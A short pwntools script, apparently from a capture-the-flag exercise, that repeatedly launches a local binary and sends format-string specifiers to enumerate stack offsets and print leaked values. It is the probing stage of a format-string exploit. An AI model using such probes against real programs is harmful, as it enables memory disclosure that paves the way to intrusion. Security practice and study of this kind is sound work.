from pwn import *

elf = context.binary = ELF('./f_one', checksec=False)

for i in range(50):
    try:
        p = process(level='error')
        p.sendlineafter("give me something", '%{}$p'.format(i).encode())
        p.recvline()

        result = p.recvline().decode()

        if result:
            print(str(i) + ': ' + str(result).strip())

    except EOFError:
        pass
